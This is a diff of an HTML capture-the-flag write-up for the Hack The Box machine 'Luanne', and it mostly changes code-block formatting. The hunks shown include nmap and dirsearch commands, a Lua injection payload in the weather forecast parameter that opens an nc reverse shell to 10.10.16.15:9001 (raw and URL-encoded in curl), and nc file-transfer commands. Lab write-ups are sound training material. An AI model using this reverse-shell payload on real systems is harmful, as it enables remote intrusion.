@@ -34,11 +34,11 @@
   <link rel="stylesheet" href="/css/main.min.css">
 
 
-  <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Luanne HTB Writeup"/>
+  <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Luanne HTB Writeup"/>
 <meta name="twitter:description" content="Luanne is an easy machine retired today .. let&rsquo;s check it out.. enjoy&hellip;
-Methodology:  Recon / Scanning Target Searching for Vulnerabilities - also understanding the target Gaining Access / Foothold Maintaining Access Privilege escalation Reporting - (don&rsquo;t forget taking notes after each step)   Enumeration: using nmap scan to see the open ports and the running services
- nmap -sC -sV -oN 10.10.10.218  Nmap scan report for **luanne."/>
+Methodology: Recon / Scanning Target Searching for Vulnerabilities - also understanding the target Gaining Access / Foothold Maintaining Access Privilege escalation Reporting - (don&rsquo;t forget taking notes after each step) Enumeration: using nmap scan to see the open ports and the running services
+nmap -sC -sV -oN 10.10.10.218 Nmap scan report for **luanne.htb** (10.10.10.218) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8."/>
+<meta name="twitter:site" content="@Wh1r1w1nd"/>
 
   <script type="application/ld+json">
 {
@@ -180,29 +180,29 @@ let&rsquo;s check it out.. enjoy&hellip;</p>
 <ul>
 <li><strong>nmap -sC -sV -oN 10.10.10.218</strong></li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Nmap scan report <span style="color:#66d9ef">for</span> **luanne.htb** <span style="color:#f92672">(</span>10.10.10.218<span style="color:#f92672">)</span>
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.0 <span style="color:#f92672">(</span>NetBSD 20190418-hpn13v14-lpk; protocol 2.0<span style="color:#f92672">)</span>
-| ssh-hostkey: 
-|   <span style="color:#ae81ff">3072</span> 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
-|   <span style="color:#ae81ff">521</span> 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
-|_  <span style="color:#ae81ff">256</span> b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
-80/tcp   open  http    nginx 1.19.0
-| http-auth: 
-| HTTP/1.1 <span style="color:#ae81ff">401</span> Unauthorized<span style="color:#ae81ff">\x</span>0D
-|_  Basic realm<span style="color:#f92672">=</span>.
-| http-robots.txt: <span style="color:#ae81ff">1</span> disallowed entry 
-|_/weather
-|_http-server-header: nginx/1.19.0
-|_http-title: <span style="color:#ae81ff">401</span> Unauthorized
-9001/tcp open  http    Medusa httpd 1.12 <span style="color:#f92672">(</span>Supervisor process manager<span style="color:#f92672">)</span>
-| http-auth: 
-| HTTP/1.1 <span style="color:#ae81ff">401</span> Unauthorized<span style="color:#ae81ff">\x</span>0D
-|_  Basic realm<span style="color:#f92672">=</span>default
-|_http-server-header: Medusa/1.12
-|_http-title: Error response
-Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
-</code></pre></div><p>There&rsquo;s a web server running on port 80:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> **luanne.htb** <span style="color:#f92672">(</span>10.10.10.218<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 8.0 <span style="color:#f92672">(</span>NetBSD 20190418-hpn13v14-lpk; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">521</span> 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  http    nginx 1.19.0
+</span></span><span style="display:flex;"><span>| http-auth: 
+</span></span><span style="display:flex;"><span>| HTTP/1.1 <span style="color:#ae81ff">401</span> Unauthorized<span style="color:#ae81ff">\x</span>0D
+</span></span><span style="display:flex;"><span>|_  Basic realm<span style="color:#f92672">=</span>.
+</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">1</span> disallowed entry 
+</span></span><span style="display:flex;"><span>|_/weather
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.19.0
+</span></span><span style="display:flex;"><span>|_http-title: <span style="color:#ae81ff">401</span> Unauthorized
+</span></span><span style="display:flex;"><span>9001/tcp open  http    Medusa httpd 1.12 <span style="color:#f92672">(</span>Supervisor process manager<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| http-auth: 
+</span></span><span style="display:flex;"><span>| HTTP/1.1 <span style="color:#ae81ff">401</span> Unauthorized<span style="color:#ae81ff">\x</span>0D
+</span></span><span style="display:flex;"><span>|_  Basic realm<span style="color:#f92672">=</span>default
+</span></span><span style="display:flex;"><span>|_http-server-header: Medusa/1.12
+</span></span><span style="display:flex;"><span>|_http-title: Error response
+</span></span><span style="display:flex;"><span>Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
+</span></span></code></pre></div><p>There&rsquo;s a web server running on port 80:
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/luanne/3.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
 <ul>
 <li>
@@ -228,8 +228,8 @@ Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
 <p>using Dirsearch:</p>
 </li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml"><span style="color:#ae81ff">python3 /home/sehs/dirsearch/dirsearch.py -u http://luanne.htb/ -e txt,html,php,log,zip,bac,bak,tar</span>
-</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/luanne/8.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#ae81ff">python3 /home/sehs/dirsearch/dirsearch.py -u http://luanne.htb/ -e txt,html,php,log,zip,bac,bak,tar</span>
+</span></span></code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/luanne/8.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
 <p>found robots.txt file &gt; this file tells the crawlers not to consider the paths inside it..
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/luanne/9.png" alt="found this /weather" class="lazyload"><figcaption class="image-caption">found this /weather</figcaption></figure></p>
 <p>so now let&rsquo;s see what&rsquo;s over there..
@@ -269,14 +269,14 @@ it&rsquo;s time for searching around:</li>
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/luanne/17.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></li>
 <li>now we need to combine both of those to make our payload</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">);</span><span style="color:#960050;background-color:#1e0010">&#39;</span>os<span style="color:#f92672">.</span><span style="color:#a6e22e">execute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.15 9001 &gt;/tmp/f&#34;</span><span style="color:#f92672">)</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
-</code></pre></div><p>and let&rsquo;s encode the payload
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span>);<span style="color:#960050;background-color:#1e0010">&#39;</span>os.<span style="color:#a6e22e">execute</span>(<span style="color:#e6db74">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.15 9001 &gt;/tmp/f&#34;</span>)<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span></code></pre></div><p>and let&rsquo;s encode the payload
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/luanne/19.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
 <ul>
 <li>note: [i got errors and the problem was in the () &gt; their encoding %28 %29 ]
 now let&rsquo;s do it again and the whole thing will be:</li>
 </ul>
-<pre><code>curl luanne.htb/weather/forecast?city=Leeds%27%29%3Bos.execute%28%22rm%2520%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.16.15%209001%20%3E%2Ftmp%2Ff%22%29--
+<pre tabindex="0"><code>curl luanne.htb/weather/forecast?city=Leeds%27%29%3Bos.execute%28%22rm%2520%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.16.15%209001%20%3E%2Ftmp%2Ff%22%29--
 </code></pre><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/luanne/20.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/luanne/21.png" alt="horay! we got our shell" class="lazyload"><figcaption class="image-caption">horay! we got our shell</figcaption></figure></p>
 <ul>
@@ -320,25 +320,25 @@ from the first sight &raquo; this backed up file <code>devel_backup-2020-09-16.t
 .. then i came back to it .. so i&rsquo;ll short it down for u and be straight forward in this &hellip;</li>
 <li>you can transfer the file on your machine to work on it like this:</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#66d9ef">On</span> your server (A):
-nc <span style="color:#f92672">-</span>l <span style="color:#f92672">-</span>p <span style="color:#ae81ff">1234</span> <span style="color:#f92672">-</span>q <span style="color:#ae81ff">1</span> <span style="color:#f92672">&gt;</span> something<span style="color:#f92672">.</span>zip <span style="color:#f92672">&lt;</span> <span style="color:#e6db74">/dev/nu</span>ll
-
-<span style="color:#66d9ef">On</span> your <span style="color:#e6db74">&#34;sender client&#34;</span> (B):
-cat something<span style="color:#f92672">.</span>zip <span style="color:#f92672">|</span> nc server<span style="color:#f92672">.</span>ip<span style="color:#f92672">.</span>here <span style="color:#ae81ff">1234</span>
-</code></pre></div><ul>
-<li>found these files and their extention so i thought they are related and searched on &lsquo;em:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">On</span> your server (A):
+</span></span><span style="display:flex;"><span>nc <span style="color:#f92672">-</span>l <span style="color:#f92672">-</span>p <span style="color:#ae81ff">1234</span> <span style="color:#f92672">-</span>q <span style="color:#ae81ff">1</span> <span style="color:#f92672">&gt;</span> something<span style="color:#f92672">.</span>zip <span style="color:#f92672">&lt;</span> <span style="color:#e6db74">/dev/nu</span>ll
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">On</span> your <span style="color:#e6db74">&#34;sender client&#34;</span> (B):
+</span></span><span style="display:flex;"><span>cat something<span style="color:#f92672">.</span>zip <span style="color:#f92672">|</span> nc server<span style="color:#f92672">.</span>ip<span style="color:#f92672">.</span>here <span style="color:#ae81ff">1234</span>
+</span></span></code></pre></div><ul>
+<li>found these files and their extention so i thought they are related and searched on &rsquo;em:
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/luanne/36.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/luanne/37.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/luanne/38.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></li>
-<li>as u can see it seems that our backup file was encrypted using this &lsquo;netpgp&rsquo; tool .. earlier i tried decompressing using openssl but it needed password.</li>
+<li>as u can see it seems that our backup file was encrypted using this &rsquo;netpgp&rsquo; tool .. earlier i tried decompressing using openssl but it needed password.</li>
 <li><code>which netpgp</code> &raquo; gives its location &lsquo;/usr/bin/netpgp&rsquo; &raquo; so we could use it to crack our file.
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/luanne/39.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></li>
 <li>Decryption:</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml"><span style="color:#ae81ff">/usr/bin/netpgp --decrypt filename --output=/path</span>
-
-<span style="color:#ae81ff">/usr/bin/netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=/tmp/backup.tar.gz</span>
-</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/luanne/40.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#ae81ff">/usr/bin/netpgp --decrypt filename --output=/path</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">/usr/bin/netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=/tmp/backup.tar.gz</span>
+</span></span></code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/luanne/40.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
 <ul>
 <li>the file is being deleted so fast &raquo; u &rsquo;ve to send it to your machine:
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/luanne/41.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
@@ -497,7 +497,7 @@ cat something<span style="color:#f92672">.</span>zip <span style="color:#f92672"
     <div class="copyright">
         &copy;
         
-        <span itemprop="copyrightYear">2020 - 2021</span>
+        <span itemprop="copyrightYear">2020 - 2024</span>
         
          
             <span class="author" itemprop="copyrightHolder"><a href="https://hussein-elsayed.github.io/">Wh1rlw1nd</a> | </span>
